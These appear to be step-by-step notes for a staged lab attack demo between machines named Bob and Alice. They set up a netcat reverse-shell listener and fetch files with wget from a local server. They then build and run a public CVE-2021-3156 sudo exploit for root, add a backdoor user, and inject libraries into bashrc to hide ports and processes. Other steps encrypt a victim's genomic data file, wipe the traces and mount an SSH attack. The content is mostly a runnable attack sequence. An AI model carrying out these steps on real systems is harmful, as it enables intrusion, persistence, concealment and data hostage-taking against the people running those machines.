explot.c and shellcode.c code from https://github.com/CptGibbon/CVE-2021-3156

Bob: nc -lvnp 9001

Alice: python3 sdfg_update.py

---------------------------We have remote shell open on bob || DO NOT TOUCH ALICE SHELL

Bob NEW TERMINAL : python3 -m http.server

(Bob RS: wget 10.0.2.4:8000/CVE-2021-3156-main_orig.zip)

Bob RS: wget 10.0.2.4:8000/hackbox.py

(Bob RS: unzip CVE-2021-3156-main_orig.zip)

Bob RS: cd CVE-2021-3156-main

Bob RS: make

Bob RS: chmod +x exploit

Bob RS: ./exploit

--------------------------------------we are now running code as with root priviledges || TERMINAL LOOKS DIFFERENT

Bob RS: cd ..

Bob RS: python3 hackbox.py addMe -new rene

… adds new user 

Bob RS: python3 hackbox.py append

…appends libraries that hide the port and processes on rot /etc/bash/bashrc file

Bob RS: python3 attacks_all.py prove

…shows we have root privileges 

Bob RS: python3 attacks_all.py encrypt ../../home/alice/Desktop/genomicdata 1234

…encrypts file with password

Bob RS: python3 attacks_all.py decrypt ../../home/alice/Desktop/genomicdata 1234

…decrypts file with password


On the end we run, 

Bob RS: python3 hackbox.py clean

…deletes the dna-logs folder, and cleans the etc/bash/bashrc, /home/alice/.bashrc files for the line that appends the libraries.

----------------------------- SSh attack

Ubuntu ssh 10.0.2.4

//follow the instructions on the screen given by the server

Ubuntu ssh 10.0.2.4

//show shuffled commands (ls, cat, who, date, …)

